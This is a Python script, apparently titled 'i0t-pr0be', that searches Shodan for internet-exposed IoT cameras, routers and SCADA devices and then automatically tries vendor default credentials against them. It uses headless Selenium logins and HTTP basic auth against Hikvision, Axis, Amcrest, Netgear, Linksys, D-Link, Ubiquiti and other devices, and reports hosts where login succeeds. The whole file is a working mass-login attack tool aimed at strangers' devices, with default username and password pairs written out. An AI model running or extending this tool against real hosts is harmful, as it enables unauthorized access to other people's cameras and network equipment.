#!/usr/bin/env python3

import os
import shodan
import argparse
import click
import sys
import csv
import logging
import re
import requests
import time
from socket import setdefaulttimeout
from colorama import Fore, Back, Style

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import StaleElementReferenceException, TimeoutException, WebDriverException, NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.common.by import By

print ("\n")
print ("\033[31m               +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+-+-+")
print ("                |i| |0| |t|   -  |p| |r| |0| |b| |e|")
print ("               +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+-+-+")
print (Fore.YELLOW + "            IoT Device Search & Default Credential Scanner")
print (Fore.GREEN + "                    ( @e13olf ^ e13olf.me )")
print (Style.RESET_ALL)

# "...you can't spell idiot without IoT."

def parse_args():
    parser = argparse.ArgumentParser(
           formatter_class=argparse.RawDescriptionHelpFormatter,
           epilog=''
           'Usage example:'
           ' Search Shodan for "Hikvision Cameras" using your API key.\n'
           './i0t-pr0be.py -s "DNVRS-Webs" -a abcdefghijklmnopqrstuvwxyz123456')
           

    parser.add_argument("-a", "--apikey", help="Your api key.")
    parser.add_argument("-p", "--pages", default='1', help="Number of pages deep to go into Shodan page_results with 100 results per page; default is 1.")
    parser.add_argument("-l", "--list", help="List the number of IoT device types tested by the script.", action='store_true')
    parser.add_argument("-s", "--shodansearch", help="Your Shodan search query. Use quotes when using filters.")
    parser.add_argument("-v", "--verbose", help="Output verbose statements.", action="store_const", dest="loglevel", const=logging.DEBUG, default= logging.WARNING,)
    parser.add_argument("-t", "--timeout", default='13', help="Set timeout value for each request; default is 13")

    args = parser.parse_args()
    logging.basicConfig(level=args.loglevel)

    return parser.parse_args()

def shodan_search(search, apikey, pages):

    if apikey:
        API_KEY = apikey
    else:
        API_KEY = ''

    api = shodan.Shodan(API_KEY)

    ip_file = []

    try:
        # Shodan_Search
        results = api.search(search, page=1)
        total_results = results['total']
        print ('\033[92m:: Total Results: %d\n' % total_results)
        print ('\033[93m:: Showing Results of Page 1...\n')
        pages = max_pages(pages, total_results)
        for result in results['matches']:
            ip_file.append('%s:%s' % (result['ip_str'], result['port']))
            print ('\033[0m%s' % result['hostnames'],'%s' % result['ip_str'],'%s' % result['port'])
        
        #Save Results in CSV 
        with open('Search_Results.csv', 'w') as f:
            writer = csv.DictWriter(f, fieldnames = ['hostnames', 'ip_str', 'port'], extrasaction='ignore')
            writer.writeheader()
            writer.writerows(results['matches'])
 
        # If the pages_args is used to query for more pages
        if pages > 1:
            i = 2
            while i <= pages:
                results = api.search(search, page=i)
                print ('\033[93m\n[*] Showing Results of Page %d...\n' % i)
                for result in results['matches']:
                    ip_file.append('%s:%s' % (result['ip_str'], result['port']))
                    print ('\033[0m%s' % result['hostnames'],'%s' % result['ip_str'],'%s' % result['port'])
                i += 1

            with open('Search_Results.csv', 'a') as f:
                writer = csv.DictWriter(f, fieldnames = ['hostnames', 'ip_str', 'port'], extrasaction='ignore')
                writer.writerows(results['matches'])

        # Filter out ports for that are not web-based
        regex = re.compile("(.*3702)|(.*554)|(.*7171)|(.*161)")
        filtered = [i for i in ip_file if not regex.match(i)]
        print((filtered), file=open("ip_file.txt", "w"))
        print (Fore.GREEN + ':: Search results saved to', (os.getcwd()) + '/Search_Results.csv')
        print (Style.RESET_ALL)


    except shodan.APIError as e:
        exit ('Error %s\n' % (e))

#Check user input_args        
def input_check(args):

    if args.list:
        exit(Fore.BLUE + 'IoT Devices supported by the script.\n' + Style.RESET_ALL + '1. Cams\n' + '   -Hikvision\n' + '   -Amcrest\n' + '   -Arecont Vision\n' + '   -Axis\n' + '   -Dahua\n\n' + '2. Routers\n' + '   -SPECTRE-3G\n' + '   -Linksys\n' + '   -Netgear\n' +  '   -D-Link SharePort(8181)\n\n' + '3. SCADA/ICS \n\n' + '4. Other network devices.\n' + '   -Ubiquiti\n')

    if not args.shodansearch:
        exit('[!] No Search-Filter found. Use the -s option to specify a Search-Filter & -a for the Shodan api key.')

#Calculate No. of Pages from query result
def max_pages(pages, total_results):

    total_pages = (total_results+100)/100
    if pages > total_pages:
        pages = total_pages
        return pages
    else:
        return pages 

def main(args):

    input_check(args)

    if args.shodansearch:
        target = shodan_search(args.shodansearch, args.apikey, int(args.pages))
    
    #Continue with scan check
    if click.confirm(Fore.YELLOW + ':: Would you like to continue and scan for Default Creds?', default=True):
        print (Style.RESET_ALL)

        #Hikvision Camera Model
        if args.shodansearch in ('DNVRS-Webs', 'hikvision', 'Hikvision-Webs', 'hikvision:"8080"', 'hikvision:"80"'):

            #headless option
            options = FirefoxOptions()
            options.add_argument("--headless")
            browser = webdriver.Firefox(options=options)
            browser.accept_untrusted_certs = True

            #opening the ip_file.txt in list format
            chars = ",'[]"
            file = open("ip_file.txt", "r")
            sites = ''.join(c for c in file.read() if c not in chars)
            sites = sites.split()
            for s in sites:
                address = "http://" + str(s)
                try:
                    browser.get(address);
                    time.sleep(10)
                    username = browser.find_element_by_xpath("//input[@id='loginUserName' or @id='username']")
                    password = browser.find_element_by_xpath("//input[@id='loginPassword' or @id='password']")

                    #If element is found, but it ain't interactable
                    try:
                        wait = WebDriverWait(browser, 10);
                        wait.until(EC.element_to_be_clickable((By.ID, "username")));
                        username.send_keys("admin")
                    except (StaleElementReferenceException, TimeoutException) as Exception:
                        pass

                    try:
                        wait = WebDriverWait(browser, 10);
                        wait.until(EC.element_to_be_clickable((By.ID, "password")));
                        password.send_keys("12345")
                    except (StaleElementReferenceException, TimeoutException) as Exception:
                        pass

                    #Login or Submit Creds    
                    time.sleep(4)
                    login_attempt = browser.find_element_by_xpath('//*[@id="lalogin" or @type="button"]')
                    login_attempt.click()
                    time.sleep(3)

                    #Finding a unique string from html source code to find if you're logged in or nah!
                    source_code = browser.page_source
                    if 'login' in source_code:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                        print (Style.RESET_ALL)
                    elif 'logout' in source_code:
                        print(Fore.GREEN + '[*] '+ (s) + ' admin:12345')
                        print (Style.RESET_ALL)

                except (WebDriverException, NoSuchElementException, StaleElementReferenceException) as Exception:
                    print (Fore.YELLOW + '[*] ' + (s) + ' TimeOut Error!')
                    print(Style.RESET_ALL)
                    pass

            file.close()
            browser.quit()
            print(':: Script Exiting ...')

        #Dahua Camera Model
        elif args.shodansearch in ('dahua'):
            print(Fore.CYAN + "[.] Dahua: plugins needed! Give it a try manually with <admin:admin> or <888888:888888 or <666666:666666>")
            print (Style.RESET_ALL)

        #Axis Camera Model
        elif args.shodansearch in ('axis', 'axis port:"8081"'):

            username = 'root'
            password = 'pass'
            chars = ",'[]"
            file = open("ip_file.txt", "r")
            sites = ''.join(c for c in file.read() if c not in chars)
            sites = sites.split()
            for s in sites:
                address = "http://" + str(s)
                try:         
                    r = requests.get(address, auth=(username, password)).content
                    req = r.decode('ISO-8859-1')
                    if 'Unauthorized' in req:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                    elif not req:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                    elif 'Apache' in req:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                    elif 'non-script' in req:
                        print ('[*] ' + (s) + ' POST to non-script is not supported in Boa.!')
                    elif 'Apache-Axis' in req:
                        print ('[*] ' + (s) + ' Apache-Axis Home Page!')            
                    else:
                        print(Fore.GREEN + '[*] '+ (s) + ' root:pass')
                        print (Style.RESET_ALL)
                except requests.exceptions.RequestException as e:
                    print (e)
            print(':: Script Exiting ...')

        #Amcrest Camera Model
        elif args.shodansearch in ('amcrest, amcrest port:"8181", amcrest port:"8083", amcrest port:"8181"'):

            #headless option
            options = FirefoxOptions()
            options.add_argument("--headless")
            browser = webdriver.Firefox(options=options)
            browser.accept_untrusted_certs = True

            #opening the ip_file.txt in list format
            chars = ",'[]"
            file = open("ip_file.txt", "r")
            sites = ''.join(c for c in file.read() if c not in chars)
            sites = sites.split()
            for s in sites:
                address = "http://" + str(s)
                try:
                    browser.get(address);
                    time.sleep(10)
                    username = browser.find_element_by_xpath("//input[@id='login_user' or @id='username']")
                    password = browser.find_element_by_xpath("//input[@id='login_psw' or @id='password']")
                
                    #If element is found, but it ain't interactable
                    try:
                        wait = WebDriverWait(browser, 10);
                        wait.until(EC.element_to_be_clickable((By.XPATH, ".//input[@id='login_user' or @id='username']")));
                        username.send_keys("admin")
                    except (StaleElementReferenceException, TimeoutException) as Exception:
                        pass

                    try:
                        wait = WebDriverWait(browser, 10);
                        wait.until(EC.element_to_be_clickable((By.XPATH, ".//input[@id='login_psw' or @id='password']")));
                        password.send_keys("admin")
                    except (StaleElementReferenceException, TimeoutException) as Exception:
                        pass

                    time.sleep(4)
                    login_attempt = browser.find_element_by_xpath("//*[@id='b_login']") 
                    login_attempt.click()
                    time.sleep(2)

                    #Finding a unique string from html source code to find if you're logged in or nah!
                    source_code = browser.page_source 
                    if 'login' in source_code:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                        print (Style.RESET_ALL)
                    elif 'logout' in source_code:
                        print(Fore.GREEN + '[*] '+ (s) + ' admin:admin')
                        print (Style.RESET_ALL)

                except (WebDriverException, NoSuchElementException, StaleElementReferenceException) as Exception:
                    print (Fore.YELLOW + '[*] ' + (s) + ' TimeOut Error!')
                    print(Style.RESET_ALL)
                    pass

            file.close()
            browser.quit()
            print (Style.RESET_ALL)
            print(':: Script Exiting ...')

        #Arecont Vision Camera Model
        elif args.shodansearch in ('arecont vision, arecont vision port:"8080", arecont vision port:"80"'):

            username = 'admin'
            password = ''
            chars = ",'[]"
            file = open("ip_file.txt", "r")
            sites = ''.join(c for c in file.read() if c not in chars)
            sites = sites.split()
            for s in sites:
                address = "http://" + str(s)
                try:
                    r = requests.get(address, auth=(username, password)).content
                    req = r.decode('ISO-8859-1')
                    if 'badauth' in req:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                    elif not req:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                    else:
                        print(Fore.GREEN + '[*] '+ (s) + ' admin:<blank>')
                        print (Style.RESET_ALL)
                except requests.exceptions.RequestException as e:
                    print (e)
            print(':: Script Exiting ...')

        #SPECTRE-3G Router model
        elif args.shodansearch in ('SPECTRE-3G, SPECTRE-3G port:"8080", SPECTRE-3G port:"80"'):

            username = 'root'
            password = 'root'
            chars = ",'[]"
            file = open("ip_file.txt", "r")
            sites = ''.join(c for c in file.read() if c not in chars)
            sites = sites.split()
            for s in sites:
                address = "http://" + str(s)
                try:
                    r = requests.get(address, auth=(username, password), verify=False).content
                    req = r.decode('ISO-8859-1')
                    if 'Authorization Required' in req:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                    elif 'General Status' in req:
                        print(Fore.GREEN + '[*] '+ (s) + ' root:root')
                        print (Style.RESET_ALL)
                except requests.exceptions.RequestException as e:
                    print (e)
            print(':: Script Exiting ...')

        #Linksys Router Model
        elif args.shodansearch in ('Linksys, Linksys port:"8080", Linksys port:"80"'):

            username = 'admin'
            password = 'admin'
            chars = ",'[]"
            file = open("ip_file.txt", "r")
            sites = ''.join(c for c in file.read() if c not in chars)
            sites = sites.split()
            for s in sites:
                address = "http://" + str(s)
                try:
                    r = requests.get(address, auth=(username, password), verify=False).content
                    req = r.decode('ISO-8859-1')
                    if 'Authorization Required' in req:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                    elif 'General Status' in req:
                        print(Fore.GREEN + '[*] '+ (s) + ' admin:admin')
                        print (Style.RESET_ALL)
                except requests.exceptions.RequestException as e:
                    print (e)
            print(':: Script Exiting ...')

        #Netgear Router Model
        elif args.shodansearch in ('Netgear, Netgear port:"8080", Netgear port:"80", Netgear port:"7547"'):

            username = 'admin'
            password = 'password'
            chars = ",'[]"
            file = open("ip_file.txt", "r")
            sites = ''.join(c for c in file.read() if c not in chars)
            sites = sites.split()
            for s in sites:
                address = "http://" + str(s)
                try:
                    r = requests.get(address, auth=(username, password), verify=False).content
                    req = r.decode('ISO-8859-1')
                    if 'System authentication failed' in req:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                    elif 'Unauthorized' in req:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')   
                    elif 'Gateway Status' in req:
                        print(Fore.GREEN + '[*] '+ (s) + ' admin:password')
                        print (Style.RESET_ALL)
                except requests.exceptions.RequestException as e:
                    print (e)

            print(':: Script Exiting ...')

        #D-Link SharePort Web Access
        elif args.shodansearch in ('D-Link, D-Link port:"8181"'):

            #headless option
            options = FirefoxOptions()
            options.add_argument("--headless")
            browser = webdriver.Firefox(options=options)

            #opening the ip_file.txt in list format
            chars = ",'[]"
            file = open("ip_file.txt", "r")
            sites = ''.join(c for c in file.read() if c not in chars)
            sites = sites.split()
            for s in sites:
                address = "http://" + str(s)
                try:
                    browser.get(address);
                    time.sleep(10)
                    username = browser.find_element_by_xpath("//input[@id='user_name']")
                    #password = browser.find_element_by_xpath("//input[@id='user_pwd']")
                
                    #If element is found, but it ain't interactable
                    try:
                        wait = WebDriverWait(browser, 10);
                        wait.until(EC.element_to_be_clickable((By.XPATH, ".//input[@id='user_name']")));
                        username.send_keys("admin")
                    except (StaleElementReferenceException, TimeoutException) as Exception:
                        pass

                    '''try:
                        wait = WebDriverWait(browser, 10);
                        wait.until(EC.element_to_be_clickable((By.XPATH, ".//input[@id='user_pwd']")));
                        password.send_keys("")
                    except (StaleElementReferenceException, TimeoutException) as Exception:
                        pass '''

                    time.sleep(2)
                    login_attempt = browser.find_element_by_xpath("//*[@id='logIn_btn'][@type='button']") 
                    login_attempt.click()
                    time.sleep(4)

                    #Finding a unique string from html source code to find if you're logged in or nah!
                    source_code = browser.page_source 
                    if 'folder_view.php' in source_code:
                        print(Fore.GREEN + '[*] '+ (s) + ' admin:<blank>')
                        print (Style.RESET_ALL)
                    else:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                        print (Style.RESET_ALL)

                except (WebDriverException, NoSuchElementException, StaleElementReferenceException) as Exception:
                    print (Fore.YELLOW + '[*] ' + (s) + ' TimeOut Error!')
                    print(Style.RESET_ALL)
                    pass

            file.close()
            print(':: Script Exiting ...')
            browser.quit()

        #Ubiquiti AirControl/AirOS Module
        elif args.shodansearch in ('Ubiquiti'):

            #headless option
            options = FirefoxOptions()
            options.add_argument("--headless")
            browser = webdriver.Firefox(options=options)

            #opening the ip_file.txt in list format
            chars = ",'[]"
            file = open("ip_file.txt", "r")
            sites = ''.join(c for c in file.read() if c not in chars)
            sites = sites.split()
            for s in sites:
                address = "http://" + str(s)
                try:
                    browser.get(address);
                    time.sleep(10)
                    username = browser.find_element_by_xpath("//input[@id='loginform-username']")
                    password = browser.find_element_by_xpath("//input[@id='loginform-password']")
                
                    #If element is found, but it ain't interactable
                    try:
                        wait = WebDriverWait(browser, 10);
                        wait.until(EC.element_to_be_clickable((By.XPATH, ".//input[@id='loginform-username']")));
                        username.send_keys("ubnt")
                    except (StaleElementReferenceException, TimeoutException) as Exception:
                        pass

                    try:
                        wait = WebDriverWait(browser, 10);
                        wait.until(EC.element_to_be_clickable((By.XPATH, ".//input[@id='loginform-password']")));
                        password.send_keys("ubnt")
                    except (StaleElementReferenceException, TimeoutException) as Exception:
                        pass 

                    time.sleep(2)
                    login_attempt = browser.find_element_by_xpath("/html/body/div[1]/div/div/form/fieldset/div[4]/input")
                    login_attempt.click()
                    time.sleep(4)

                    #Finding a unique string from html source code to find if you're logged in or nah!
                    source_code = browser.page_source 
                    if 'logout' in source_code:
                        print(Fore.GREEN + '[*] '+ (s) + ' ubnt:ubnt')
                        print (Style.RESET_ALL)
                    elif 'login' in source_code:
                        print (Fore.RED + '[*] ' + (s) + ' Failed!')
                        print (Style.RESET_ALL)

                except (WebDriverException, NoSuchElementException, StaleElementReferenceException) as Exception:
                    print (Fore.YELLOW + '[*] ' + (s) + ' TimeOut Error!')
                    print(Style.RESET_ALL)
                    pass

            file.close()
            print(':: Script Exiting ...')
            browser.quit()

        else:
            print("No module has been created for your type of device.")

    else:
        print (Style.RESET_ALL)
        exit(':: Script Exiting ...')

    if target == [] or target == None:
        exit()

         
if __name__ == "__main__":
    main(parse_args())